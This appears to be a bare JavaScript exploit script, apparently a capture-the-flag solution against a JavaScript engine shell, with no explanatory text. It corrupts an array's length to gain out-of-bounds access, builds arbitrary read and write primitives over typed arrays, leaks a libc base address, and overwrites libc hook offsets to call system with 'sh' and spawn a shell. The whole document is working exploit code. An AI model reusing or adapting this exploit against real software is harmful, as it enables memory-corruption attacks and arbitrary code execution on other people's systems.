var conv=new ArrayBuffer(8),
      convf64=new Float64Array(conv),
      convu32=new Uint32Array(conv),
      qword2Double=function(b,a) {
          convu32[0]=b;
          convu32[1]=a;
          return convf64[0]
      },
      doubleFromFloat = function(b,a) {
          convf64[0]=b;
          return convu32[a]
          
      }

var a = [1];
var c = new Uint32Array(0x17);
var d = new Uint32Array(0x19);
for(var i = 0; i < c.length; i++) c[i] = 0x41414141;
for(var i = 0; i < d.length; i++) d[i] = 0x42424242;
a.length = 0xffff;
a.pop(a.length-1);
function hex(z){
	if(z)
	return z.toString(16);
else return '';
}
function aprint(x, limit){
	if(!limit) limit = 500;
	for(var i = 0; i < x.length; i++) {
		print(i, x[i]);
	}
}
var z = a.map(function(x){if(x)return x.toString(16).replace(/0\./, '').substr(-16)});
var z2 = a.map(function(x){if(x)return hex(doubleFromFloat(x,1))+hex(doubleFromFloat(x,0));})
// aprint(z);
// aprint(z2);
var base19 = z.indexOf('19'),
base17 = z.indexOf('17');
bbase = [doubleFromFloat(a[base19],0),doubleFromFloat(a[base19],1)];
a[base19] =
a[base17] = 0xffffffff;
for(var i = 0; i < 10000; i+=2) {
	if(hex(c[i]).indexOf('a70')==5) {
		print(hex(c[i+1])+hex(c[i]));
		break;
	}
}
var j = i,
low=c[j],
high=c[j+1];
low-=0x796a70;
function r_(low,high){
	a[base19+2]=qword2Double(low,high);
	print(hex(d[1])+hex(d[0]));
	return [d[0], d[1]];
}
function w_(low,high, dlow, dhigh){
	a[base19+2]=qword2Double(low,high);
	d[0] = dlow;
	d[1] = dhigh;
}
print(hex(high)+hex(low));
r_(low, high);
lbase = r_(low+0x78bdf0, high);
lbase[0] -= 0x83940;
w_(lbase[0]+0x00000000003C4620, lbase[1], 0x0f006873, 0);
w_(lbase[0] + 0x3c4ff0, lbase[1], lbase[0] + 0x0000000000045390, lbase[1]);
w_(lbase[0] + 0x3c46f8, lbase[1], lbase[0] + 0x3c4ff0 - 0x38, lbase[1]);
print(1);
while(1);
if(1)
for(var i = 0x18; i < 0x17 + 5000; i+=2) {
	if(c[i+1] != 0 || c[i] != 0)
		print(i, c[i+1].toString(16) + c[i].toString(16));
}
w_(0x41414141, 1);